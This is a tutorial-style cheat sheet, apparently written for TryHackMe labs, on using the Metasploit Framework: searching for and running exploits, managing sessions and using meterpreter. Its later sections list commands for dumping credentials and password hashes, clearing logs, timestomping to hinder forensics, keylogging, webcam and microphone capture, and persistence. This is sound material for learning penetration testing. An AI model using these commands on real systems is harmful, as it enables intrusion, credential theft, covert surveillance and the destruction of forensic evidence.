# Metasploit Framework

[![metasploitintro](../../../_badges/thm/metasploitintro.svg)](https://tryhackme.com/room/metasploitintro)
[![rpmetasploit](../../../_badges/thm/rpmetasploit.svg)](https://tryhackme.com/room/rpmetasploit)

<div class="row row-cols-md-2"><div>

The [Metasploit Framework](https://github.com/rapid7/metasploit-framework) is a penetration testing framework that you can use to test your systems. Metasploit is divided into **modules** 📌

* **Auxiliary**: test the availability of an exploit
* **Payloads**: the data sent to perform the attack
  * single/inline payloads
  * staged payloads
* **Exploits**: code exploiting a vulnerability
* Encoders/Evasion/NOPs
* **Post**: scripts that you can use once on the target

> **Note**: to learn more about payloads, see [msfvenom](/cyber/exploitation/general/shell.md#msfvenom-to-create-shells)
</div><div>

Start the `msfconsole` 🚀

```bash
$ msfconsole -q
msf6 > help
msf6 > help <command>
# example
msf6 > help help
```

Links

* [Metasploit Documentation](https://docs.metasploit.com/)
* [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/) 📌
</div></div>

<hr class="sep-both">

## 🔎 Search for modules 🔎

<div class="row row-cols-md-2"><div>

#### ✨️First: search a module

The first thing you want to do is to find exploits <small>(to perform an attack)</small> or auxiliary <small>(to see if the target is vulnerable)</small>. In any case, you will use `search`

```bash
msf6 > search xxx yyy # search by terms
msf6 > search CVE-YEAR-ID # CVE
msf6 > search exploit/xxx/yyy/ # module
msf6 > search type:xxx [...] # only exploit...
msf6 > search cve:year [...] # only disclosed in year
```

Examples

```bash
msf6 > search apache tomcat
msf6 > search exploit/linux/local/
msf6 > search type:auxiliary cve:2022 wordpress
```

#### ✨️Second (optional): learn more about it

```bash
msf6 > info module_name # ex: exploit/xxx/...
# the values in the '#' column of your search
msf6 > info module_index # ex: 0
```
</div><div>

#### ✨️ Third: use it

Once you selected your exploit/..., you need to tell metasploit that you want to play with it. For that, you will use the command `use`.

```bash
msf6 > use module_name # ex: exploit/xxx/...
msf6 > use module_index # ex: 0
```

Examples

```bash
msf6 > search eternalblue pool
#  Name  Disclosure Date  Rank     Check  Description
-  ----  ---------------  ----     -----  -----------
0  exploit/windows/smb/ms17_010_eternalblue  [...]

# you can use
msf6 > use 0
msf6 > use ms17_010_eternalblue # will not always work
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```
</div></div>

<hr class="sep-both">

## 🖍️ Configure your module 🖍️

<div class="row row-cols-md-2"><div>

#### ✨️ Four: set the options

Much like with manual exploits, almost every time you need to configure it. You can list the options of your module with

```bash
msf6 exploit('module_used') > options
msf6 exploit('module_used') > show options # same
```

You must at least give a value to options marked as required.

```bash
msf6 exploit('module_used') > set <option> <value>
# example with RHOSTS
msf6 exploit('module_used') > set RHOSTS target_ip
```

Some options that you will see often

* `set LHOST IP`: your IP
* `set RHOSTS IP`: your target IP
* `set RPORT PORT`: your port

⚠️ If you are using a VPN, such as on TryHackMe, you will use your VPN interface, otherwise you will see a message `"[...] exploit succeeded but no session was created [...]"` for reverse shells, because the target can't reach you.

```bash
msf6 exploit('module_used') > set LHOST tun0
```
</div><div>

#### ✨️ Five (optional): set the target

For some exploits, you can use different targets. If you can see at the bottom of options a mention to a target, then that's your case.

```bash
msf6 [...] > show targets # list targets that you can use
msf6 [...] > set target 2 # use target 2
```

#### ✨️ Six (optional): set the payload

Some exploits come with a pre-defined payload, but for most, you will have to pick your payload. 🔎 For most basics CTF, using the default payload is good enough.

```bash
msf6 [...] > show payloads
msf6 [...] > set payload 1
msf6 [...] > set payload payload_name
```

#### ✨️ Seven: open fire 🔫!

Run you exploit. If you're successful, a remote shell, in which you can enter commands, will be opened on the host.

```bash
msf6 exploit('module_used') > run
msf6 exploit('module_used') > exploit # same
ls # no meterpreter
meterpreter > ls # meterpreter
```
</div></div>

<hr class="sep-both">

## ⚡️ Unleashing metasploit ⚡

<div class="row row-cols-md-2 mt-4"><div>

Before proceeding with the step 8, there are a couple a things that could make your life easier, both in the previous, and in the next steps.


* 🔨  You can execute the associated auxiliary (if any) before running the exploit

```bash
msf6 exploit('module_used') > check
```

* You can set variable globally. You will most likely enjoy this feature, because you will usually go back and forth between modules, and you don't want to set the same options again and again.

```bash
msf6 exploit('module_used') > setg LHOST tun0
msf6 exploit('module_used') > setg RHOSTS x.x.x.x
```

* You can unset variables, which will give them back their default value

```bash
msf6 exploit('module_used') > unset RHOSTS
msf6 exploit('module_used') > unset all
```

</div><div>

* 📜 You can see the history <small>(every command you used)</small>

```bash
msf6 exploit('module_used') > history
```

* ⬅️You can go back to "no module selected" without having to close metasploit with `back`

```bash
msf6 exploit('module_used') > back
msf6 > # you're back
```
</div></div>

<hr class="sep-both">

##  📝 Learn about sessions 📝

<div class="row row-cols-md-2"><div>

You should have seen this word when you got your reverse shell. Each reverse shell is available through a session.

* From another reverse shell, you can go back to the msfconsole without closing the session with `CTRL-Z` or commands below

```bash
# if no meterpreter
bg
background
# if you got meterpreter
meterpreter > bg
meterpreter > background
```
</div><div>

* List sessions

```bash
msf6 exploit('module_used') > sessions
```

* Move to another session

```bash
msf6 exploit('module_used') > sessions  -i 1
```

* Kill/close a session

```bash
msf6 exploit('module_used') > sessions  -k 1
```
</div></div>

<hr class="sep-both">

##  🏎️ Getting your meterpreter 🏎

<div class="row row-cols-md-2"><div>

#### ✨️ Eight (optional): meterpreter

A meterpreter is a reverse shell in which some post modules were loaded to make your privilege escalation easier, along with your post-exploitation tasks.

* 🚀 Upgrade your shell to a meterpreter

```bash
background # go back, note the session id
msf6 exploit('module_used') > sessions -u -1
msf6 exploit('module_used') > sessions -k old_session_id # kill old
msf6 exploit('module_used') > sessions -i new_session_id # move to meterpreter
meterpreter > # yesss
```

It's useful to note that the commands that you can use in the meterpreter are different based on the payload that you used. You will usually call `help` to see what you can use.

```bash
meterpreter > help # list commands that you can use
```

<details class="details-e">
<summary>You can use many Linux-like commands</summary>

```bash
meterpreter > ls # list files
meterpreter > cd # move
meterpreter > pwd # path to current folder
meterpreter > cat file # print file
meterpreter > edit file # open file in vim
meterpreter > ps # see running processes
meterpreter > exit
```
</details>

<details class="details-e">
<summary>Execute commands on your local machine</summary>

```bash
meterpreter > lpwd # or getlwd, local path
meterpreter > lcd path # move to local path
meterpreter > lls path # list local files
meterpreter > lcat file # print local file
```
</details>

Other useful commands

```bash
meterpreter > search -f pattern # search file by pattern
meterpreter > search -f pattern / # search inside /
meterpreter > download remote_path local_path # download
meterpreter > upload local_path remote_path # upload
```

</div><div>

* ➡️ See if you are root and your privileges

```bash
meterpreter > getuid
# Windows: NT AUTHORITY\SYSTEM = admin 😎
```

* ➡️ Learn more about the system. Here with Windows, you could look for CVEs given the build version. The architecture can help too, as some scripts are less useful on some architectures.

```bash
meterpreter > sysinfo
# Computer        : XXX-PC
# OS              : Windows X (... Build xxx...).
# Architecture    : x64
```

* ➡️ Start a shell: `sh/bash` on Linux, `cmd` on Windows

```bash
meterpreter > shell # start a shell
C:\WINDOWS\system32> # Windows cmd
```

* ➡️ Ask for suggested exploits

```bash
meterpreter > run post/multi/recon/local_exploit_suggester
```

* ➡️ Load a local file `commands.txt` with meterpreter commands

```bash
meterpreter > resource commands.txt
```

* ➡️ 📝 Migrate to another process 📝. This is something as some services/stuff need us to be "in" a process that has the same architecture, and the same permissions, that our target. **Usually**, any process run by "NT AUTHORITY\SYSTEM"/root should be okay, although you may have to try a few times.

```bash
meterpreter > ps # list process
meterpreter > migrate process_pid # move to another process
meterpreter > migrate -N process_name # same
```

</div></div>

<hr class="sep-both">

## Notes for Windows meterpreter

<div class="row row-cols-md-2 mt-3"><div>

* ➡️ See your privileges

```bash
meterpreter > getprivs
```

* ➡️ Try automatic privilege escalation 😎 ([more information](https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/)).

```bash
meterpreter > getsystem
```
</div><div>

* ➡️ Dump in-memory passwords

```bash
meterpreter > load kiwi
meterpreter > migrate some_process_nt_system_compatible
meterpreter > creds_all # retrieve all credentials
meterpreter > # you can also create a backdoor...
```

* ➡ | ️`root`. Dump every credential stored by the system. Passwords must be [cracked/dehashed](/cyber/random/crack_password/index.md#windows-password-cracking). You can use a [hash to login](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/).

```bash
meterpreter > hashdump
# You may try to crack them using john within the msfconsole
msf6 exploit('module_used') > use auxiliary/analyze/crack_windows
msf6 exploit('module_used') > set CUSTOM_WORDLIST /usr/share/wordlists/rockyou.txt
msf6 exploit('module_used') > run
```
</div></div>

<hr class="sep-both">

## Notes for Linux meterpreter

<div class="row row-cols-md-2"><div>

You may use `upload`/`download`, but most of the time, you will be faster doing by running `shell` and doing things manually (without using metasploit modules).
</div><div>

* ➡ | ️`root`. Dump every credential stored by the system. Passwords must be [cracked/dehashed](/cyber/random/crack_password/index.md#linux-shadow-hash-cracking). You can use a [hash to login](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/).

```bash
# basically, all that to do, cat /etc/shadow
meterpreter > bg
msf6 exploit('module_used') > use post/linux/gather/hashdump
msf6 exploit('module_used') > set SESSION 1
msf6 exploit('module_used') > run
```
</div></div>

<hr class="sep-both">

## 🥳 Last step: have fun 🥳

<div class="row row-cols-md-2 mt-4"><div>

* ➡️ | `root`. Clear logs

```bash
meterpreter > clearev
```

* ➡️  | `root`. Mess with timestamp to complicate forensics

```bash
meterpreter > timestomp
```

* ➡️ Random commands

```bash
meterpreter > idletime # time the host was idle
meterpreter > ipconfig # network information
meterpreter > localtime # time and date
# others
meterpreter > getenv
meterpreter > checksum
```
</div><div>

All the commands below require administrative/root privileges.

<details class="details-e">
<summary>Take control of the webcam</summary>

```bash
meterpreter > webcam_list
meterpreter > webcam_snap
```
</details>

<details class="details-e">
<summary>Take a screenshot</summary>

```bash
meterpreter > migrate -N explorer.exe
meterpreter > use espia
meterpreter > screengrab
```

You may also use `screenshot` 📌.
</details>

<details class="details-e">
<summary>Install a key logger</summary>

```bash
meterpreter > migrate -N explorer.exe
meterpreter > keyscan_start # start
meterpreter > keyscan_dump # dump keys
```
</details>

<details class="details-e">
<summary>Watch the screen in real time</summary>

Watch the remote user desktop in real time

```bash
meterpreter > screenshare
meterpreter > record_mic # Record audio from the default microphone for X seconds
```
</details>

<details class="details-e">
<summary>Record microphone</summary>

Record audio from the default microphone for X seconds

```bash
meterpreter > record_mic
```
</details>

<details class="details-e">
<summary>Enable Remote Desktop Protocol</summary>

```bash
meterpreter > run post/windows/manage/enable_rdp
```
</details>

<details class="details-e">
<summary>Persistence</summary>

See [METERPRETER SERVICE](https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/).

```bash
# Automatically start the agent when the system boots
meterpreter > run persistence -X
```
</details>
</div></div>

<hr class="sep-both">

## 💾 The Metasploit database 💾

<div class="row row-cols-md-2"><div>

First, start a msf database

```bash
$ sudo systemctl start postgresql
$ sudo msfdb init
# I got some errors, but it still works
```

Then in your msfconsole

```bash
$ msfconsole -q
msf6 > db_status # check if connected
[*] Connected to msf. Connection type: postgresql.
```

To keep things clean and tidy, it's better to create a workspace, so that results from others scans don't get mixed up.

```bash
msf6 > workspace # list workspaces
msf6 > workspace -a xxx # create xxx
msf6 > workspace xxx # move to xxx
msf6 > workspace -d xxx # delete xxx
```
</div><div>

* ➡️ You can start a scan and store results inside the database

For instance, a scan from [nmap](/cyber/discovery/nmap/index.md#-metasploit-and-nmap-) or [nessus](/cyber/discovery/nessus/index.md#-metasploit-and-nessus-).

* ➡️ Once you got your scan in, here are some commands

```bash
msf6 > help hosts
# list hosts
msf6 > hosts
# add all to RHOSTS
msf6 exploit('module_used') > hosts -R
```

```bash
msf6 > help services
# list hosts with an ftp port open
msf6 > services -S ftp
```

If you detected vulnerabilities too

```bash
msf6 > help vulns
# hosts with a vulnerable ftp service
msf6 > vulns -s ftp
# hosts having <keyword> in a vulnerability
msf6 > vulns -S keyboard
```
</div></div>